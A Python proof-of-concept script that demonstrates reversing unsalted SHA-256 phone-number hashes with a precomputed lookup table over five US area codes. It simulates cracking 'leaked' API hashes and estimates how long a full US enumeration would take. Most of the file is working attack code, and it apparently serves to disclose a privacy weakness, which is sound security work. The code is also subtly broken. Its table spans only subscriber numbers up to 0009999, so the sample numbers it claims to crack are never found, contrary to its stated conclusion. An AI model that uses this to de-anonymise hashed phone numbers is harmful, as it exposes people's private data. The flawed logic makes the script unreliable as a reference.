#!/usr/bin/env python3
"""
Proof of Concept: Phone Number Enumeration via Rainbow Table Attack
Demonstrates how unsalted SHA256 hashes can be reversed for phone numbers.
"""

import hashlib
import time
from typing import Dict, List


def vulnerable_hash_phone_number(phone_number: str) -> str:
    """Vulnerable version using SHA256 without salt"""
    return hashlib.sha256(phone_number.encode()).hexdigest()


def generate_rainbow_table(country_code: str, area_codes: List[str], size: int = 10000) -> Dict[str, str]:
    """Generate rainbow table for common phone numbers"""
    rainbow_table = {}
    
    print(f"[*] Generating rainbow table for country code {country_code}...")
    print(f"[*] Area codes: {', '.join(area_codes)}")
    print(f"[*] Generating {size} entries per area code...")
    print()
    
    start_time = time.time()
    total_entries = 0
    
    for area_code in area_codes:
        for i in range(size):
            # Generate phone number in E.164 format
            phone_number = f"{country_code}{area_code}{i:07d}"
            phone_hash = vulnerable_hash_phone_number(phone_number)
            rainbow_table[phone_hash] = phone_number
            total_entries += 1
            
            if total_entries % 10000 == 0:
                print(f"    Generated {total_entries:,} entries...")
    
    elapsed = time.time() - start_time
    print(f"[+] Rainbow table generated: {total_entries:,} entries in {elapsed:.2f}s")
    print(f"[+] Rate: {total_entries/elapsed:,.0f} hashes/second")
    print()
    
    return rainbow_table


def crack_phone_hash(phone_hash: str, rainbow_table: Dict[str, str]) -> str:
    """Attempt to crack a phone number hash using rainbow table"""
    return rainbow_table.get(phone_hash, None)


def phone_enumeration_demo():
    """Demonstrate phone number enumeration attack"""
    print("=" * 70)
    print("PROOF OF CONCEPT: Phone Number Enumeration via Rainbow Table")
    print("=" * 70)
    print()
    
    # Common US area codes
    us_area_codes = ["212", "310", "415", "650", "917"]  # NYC, LA, SF, etc.
    
    # Generate rainbow table for US numbers
    rainbow_table = generate_rainbow_table(
        country_code="+1",
        area_codes=us_area_codes,
        size=10000  # 10,000 numbers per area code = 50,000 total
    )
    
    # Simulate leaked phone number hashes from API
    test_phones = [
        "+12125551234",  # NYC number
        "+13105559876",  # LA number
        "+14155550001",  # SF number
        "+19175554321",  # NYC mobile
        "+16505552468",  # SF Bay Area
    ]
    
    print("Simulated Attack Scenario:")
    print("-" * 70)
    print("[*] Attacker intercepts hashed phone numbers from API responses...")
    print("[*] Attempting to reverse hashes using rainbow table...")
    print()
    
    cracked_count = 0
    for phone in test_phones:
        phone_hash = vulnerable_hash_phone_number(phone)
        print(f"Hash: {phone_hash[:32]}...")
        
        cracked = crack_phone_hash(phone_hash, rainbow_table)
        if cracked:
            print(f"  ✓ CRACKED! Phone number: {cracked}")
            cracked_count += 1
        else:
            print(f"  ✗ Not found in rainbow table (yet)")
        print()
    
    print("Attack Results:")
    print("-" * 70)
    print(f"  Total hashes tested: {len(test_phones)}")
    print(f"  Successfully cracked: {cracked_count}")
    print(f"  Success rate: {cracked_count/len(test_phones)*100:.1f}%")
    print()
    
    # Calculate full attack feasibility
    print("Full Attack Feasibility Analysis:")
    print("-" * 70)
    
    # E.164 format: +[country code][area code][subscriber number]
    # US: +1 [3-digit area code] [7-digit number]
    total_us_numbers = 1000 * 10_000_000  # ~1000 area codes * 10M numbers each
    
    print(f"  Total possible US phone numbers: {total_us_numbers:,}")
    print(f"  Rainbow table size (50k entries): {len(rainbow_table):,}")
    print(f"  Coverage: {len(rainbow_table)/total_us_numbers*100:.4f}%")
    print()
    
    # Time to generate full rainbow table
    hash_rate = 100000  # Conservative estimate: 100k hashes/sec
    time_for_full_table = total_us_numbers / hash_rate / 3600 / 24
    
    print(f"  Time to generate FULL rainbow table:")
    print(f"    At {hash_rate:,} hashes/sec: {time_for_full_table:.1f} days")
    print()
    
    print("[!] VULNERABILITY IMPACT:")
    print("    1. Phone numbers are PII and can be enumerated")
    print("    2. Rainbow tables are feasible for targeted attacks")
    print("    3. Common area codes can be cracked quickly")
    print("    4. No computational barrier to prevent enumeration")
    print("    5. Violates user privacy expectations")
    print()
    
    # Demonstrate hash collision resistance
    print("Additional Security Concerns:")
    print("-" * 70)
    print("[*] Testing hash determinism...")
    hash1 = vulnerable_hash_phone_number("+12125551234")
    hash2 = vulnerable_hash_phone_number("+12125551234")
    
    if hash1 == hash2:
        print("  ✓ Hashes are DETERMINISTIC (same input = same output)")
        print("  [!] This enables precomputation attacks!")
    print()
    
    print("=" * 70)
    print("CONCLUSION: Unsalted SHA256 enables phone number enumeration")
    print("=" * 70)


if __name__ == "__main__":
    phone_enumeration_demo()
